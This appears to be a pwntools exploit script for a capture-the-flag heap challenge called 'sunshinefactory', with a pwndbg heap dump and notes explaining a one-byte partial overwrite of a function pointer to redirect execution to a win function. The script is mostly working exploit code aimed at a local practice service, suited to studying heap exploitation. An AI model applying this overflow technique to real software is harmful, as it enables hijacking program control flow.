#!/usr/bin/python3
"""
&win: 0x57769f8f32ca
&check_heap_fail: 0x57769f8f32a9

idea: overwrite only the least significant byte of the function so that when canary is changed, win is called instead of check_heap_fail

what heap looks like after creating one sunshine:
pwndbg> x/32gx 0x555555559ab0
0x555555559ab0: 0x0000000000000000      0x0000000000000021
0x555555559ac0: 0x6161616161616161      0x00000a6161616161 <- actual data
0x555555559ad0: 0x0000000000000000      0x0000000000000021
0x555555559ae0: 0xd5745a0206f90930      0x0000555555555289 <- checker
0x555555559af0: 0x0000000000000000      0x0000000000000021
0x555555559b00: 0x0000555555559ac0      0x0000555555559ae0 <- sunshine
0x555555559b10: 0x0000000000000000      0x00000000000204f1
"""

from pwn import *
context.log_level = 'debug'

context.arch = 'amd64'

# p = process("./sunshinefactory")
p = remote("localhost", 33001)
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Enter sunshine size needed: ", b"16")
payload = flat({
    0x10: 0,
    0x18: 0x21,
    0x20: 0
})
payload += b'\xca'
pause()
p.sendafter(b"content: ", payload)
p.sendlineafter(b"> ", b"2")
p.interactive()